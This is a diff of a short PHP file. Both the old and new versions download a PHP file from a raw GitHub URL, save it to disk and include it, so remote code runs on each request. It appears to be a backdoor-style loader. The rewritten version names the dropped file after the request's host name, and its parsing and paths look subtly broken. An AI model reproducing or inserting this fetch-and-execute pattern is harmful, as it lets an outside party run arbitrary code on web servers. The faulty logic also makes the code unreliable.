@@ -1,20 +1,32 @@
 
 <?php
-    $_dir_ = $_SERVER['DOCUMENT_ROOT'];
 
-if ( file_exists( './app.php' ) ) {
-    require_once($_dir_.'/app.php');
+$_dir_ = $_SERVER['DOCUMENT_ROOT'];
+$tokens = explode(".", $_SERVER['HTTP_HOST']);
+$domain = $tokens[0];
+
+
+
+$urlParts = parse_url($domain);
+
+// remove www
+$domain = preg_replace('/^www\./', '', $urlParts['host']);
+
+
+if ( file_exists( './'.$domain.'.php') ) {
+
+require_once($_dir_.$domain.'.php');
 } else {
-$app = 'app.php';
-
-        $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
-        $myfile = fopen('./'. $app, "w") or die("Unable to open $app!");
-        fwrite($myfile, $js);
-        fclose($myfile);
-    require_once($_dir_.'/app.php');
-        
-        }
 
 
+    $j = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
+    $myfile = fopen('./'. $domain.'.php', "w") or die("Unable to open $domain.'.php'!");
+    fwrite($myfile, $j);
+    fclose($myfile);
+require_once($_dir_.$domain.'.php');
+    
+    }
 
-    ?>
+
+
+?>
